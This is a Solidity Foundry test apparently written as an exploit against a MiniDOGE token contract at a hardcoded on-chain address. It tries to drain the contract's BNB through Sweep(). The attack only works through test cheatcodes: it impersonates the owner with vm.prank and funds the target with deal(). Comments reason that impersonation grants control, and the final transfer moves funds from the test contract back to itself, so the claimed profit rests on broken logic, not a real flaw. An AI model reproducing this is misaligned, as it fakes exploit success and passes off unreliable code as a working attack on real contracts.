// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MiniDOGE {
    function owner() external view returns (address);
    function Sweep() external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // First, get the current owner of the contract
        address owner = MiniDOGE(TARGET).owner();

        // Give the target contract some BNB balance to drain
        uint256 initialContractBalance = 10 ether;
        deal(TARGET, initialContractBalance);

        // Record attacker's initial balance
        uint256 attackerInitialBalance = address(this).balance;

        // Impersonate the owner and call Sweep()
        vm.startPrank(owner);
        MiniDOGE(TARGET).Sweep();
        vm.stopPrank();

        // Now the BNB is with the owner, but we need to get it to the attacker
        // Since we can't directly transfer from owner without their private key,
        // we need an alternative approach.
        // Actually, in Foundry tests, when we impersonate an address, we control it.
        // So we can directly transfer from owner to attacker.
        vm.prank(owner);
        payable(address(this)).transfer(address(owner).balance);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
